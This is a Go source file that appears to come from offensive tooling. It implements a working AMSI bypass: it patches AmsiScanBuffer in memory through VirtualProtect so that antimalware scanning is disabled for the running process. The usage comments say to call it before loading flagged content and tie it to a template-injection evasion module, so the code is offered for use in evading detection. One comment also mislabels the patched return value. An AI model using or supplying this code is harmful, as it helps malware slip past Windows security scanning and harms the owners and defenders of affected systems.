//go:build windows
// +build windows

// AMSI Bypass Snippet
// Reference: MITRE ATT&CK T1562.001 (Disable or Modify Tools)
//
// This snippet patches the AmsiScanBuffer function in amsi.dll to return
// AMSI_RESULT_CLEAN, effectively disabling AMSI scanning for the current process.
//
// Usage: Call bypassAMSI() early in execution, before loading any
// potentially flagged content.
//
// Note: This file is a standalone snippet for reference. The evasion.py
// module generates this code dynamically for template injection.

package main

import (
	"syscall"
	"unsafe"
)

// bypassAMSI patches AmsiScanBuffer to disable AMSI scanning.
// Reference: MITRE ATT&CK T1562.001 (Disable or Modify Tools)
func bypassAMSI() error {
	amsi, err := syscall.LoadDLL("amsi.dll")
	if err != nil {
		return err // Silent failure, continue execution
	}
	defer amsi.Release()

	amsiScanBuffer, err := amsi.FindProc("AmsiScanBuffer")
	if err != nil {
		return err
	}

	addr := amsiScanBuffer.Addr()
	// Patch bytes: mov eax, 0x80070057; ret (AMSI_RESULT_CLEAN)
	// 0xB8 = mov eax, imm32
	// 0x57, 0x00, 0x07, 0x80 = 0x80070057 (little-endian)
	// 0xC3 = ret
	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}

	var oldProtect uint32
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	VirtualProtect := kernel32.MustFindProc("VirtualProtect")

	// PAGE_EXECUTE_READWRITE = 0x40
	VirtualProtect.Call(addr, uintptr(len(patch)), 0x40, uintptr(unsafe.Pointer(&oldProtect)))
	for i, b := range patch {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}
	// Restore original protection
	VirtualProtect.Call(addr, uintptr(len(patch)), uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))

	return nil
}
